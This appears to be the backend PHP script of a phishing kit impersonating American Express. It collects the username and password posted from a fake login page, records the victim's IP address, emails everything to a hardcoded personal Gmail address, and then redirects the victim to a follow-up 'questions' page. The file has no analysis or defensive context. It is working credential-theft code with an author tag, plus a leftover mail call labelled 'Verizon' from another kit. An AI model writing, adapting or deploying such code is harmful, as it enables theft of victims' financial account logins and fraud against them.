<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Created By rYan-----------------------\n";
$message .= "--------------AMex-ID-----------------------\n";
$message .= "---------------------------\n";
$message .= "username: ".$_POST['username']."\n";
$message .= "password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By rYan------------------------------\n";


$recipient = "northbryan4u@gmail.com";
$subject = "AMex-ID";
$headers = "rYan";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "Verizon", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: questions.html");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>
